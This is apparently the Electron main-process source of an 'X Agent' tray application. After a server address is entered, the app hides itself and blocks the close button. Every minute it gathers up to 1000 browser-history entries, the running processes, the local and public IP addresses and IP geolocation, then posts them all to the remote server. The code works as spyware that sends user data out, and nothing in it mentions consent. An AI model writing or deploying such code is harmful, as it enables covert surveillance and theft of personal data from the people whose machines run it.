const { app, BrowserWindow, ipcMain, Tray, Menu } = require('electron');
const axios = require('axios');
const path = require('path');
const BrowserHistory = require('node-browser-history');
const localIpUrl = require('local-ip-url');


let mainWindow;
let tray;
let serverAddress;

app.on('ready', () => {
  createWindow();
  createTray();
});

const userLocalIP = {
  localIP: localIpUrl(), // => 192.168.31.69
  url: localIpUrl('public'), // => 192.168.31.69
  IPV4: localIpUrl('public', 'ipv4'), // => 192.168.31.69
  IPV6: localIpUrl('public', 'ipv6'), // => fe80::c434:2eff:fe06:f90

}

async function fetchIPData() {
  try {
    const response = await axios.get('https://ipwhois.app/json/');
    return response.data;
  } catch (error) {
    console.error('Error fetching IP data:', error.message);
    return null;
  }
}

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
  });

  mainWindow.loadFile('index.html');

  // Handle window close
  mainWindow.on('close', (event) => {
    // Prevent the window from being closed
    event.preventDefault();
    mainWindow.hide();
  });

  // Handle window closed
  mainWindow.on('closed', () => {
    mainWindow = null;
  });
}

function createTray() {
  tray = new Tray(path.join(__dirname, 'assets', 'x.png'));

  const contextMenu = Menu.buildFromTemplate([
    {
      label: 'Show App',
      click: () => {
        mainWindow.show();
      },
    },
    {
      label: 'Quit',
      click: () => {
        app.quit();
      },
    },
  ]);

  tray.setToolTip('X Agent | Electron JS Cross Platfrom Agent Application');
  tray.setContextMenu(contextMenu);
}

// Fetch browser history and send to the server every minute
setInterval(() => {
  if (serverAddress) {
    fetchDataAndSend(serverAddress);
  }
}, 60000); // 1 minute interval

ipcMain.on('fetch-and-send-data', async (event, newServerAddress) => {
  serverAddress = newServerAddress;

  // Fetch and send data immediately
  if (serverAddress) {
    fetchDataAndSend(serverAddress);
  }

  // Hide the window after taking input
  mainWindow.hide();
});

async function fetchDataAndSend(serverAddress) {
  try {
    // Fetch browser history data
    // const historyModule = await import('electron-history');
    // const browserHistory = await historyModule.get();

    const browserHistory = await BrowserHistory.getAllHistory(1000).then(function (history) {
      return history;
    });

    // Fetch running processes
    const psListModule = await import('ps-list');
    const runningProcesses = await psListModule.default();
    const userIPData = await fetchIPData();

    const dataToSend = {
      user: userIPData,
      userLocalIP,
      ...browserHistory,
      runningProcesses,
    };

    // Send data to the server using the provided address
    const response = await axios.post(serverAddress, dataToSend);

    // Handle the server response if needed
    console.log('Server Response:', response.data);
  } catch (error) {
    console.error('Error:', error.message);
  }
}
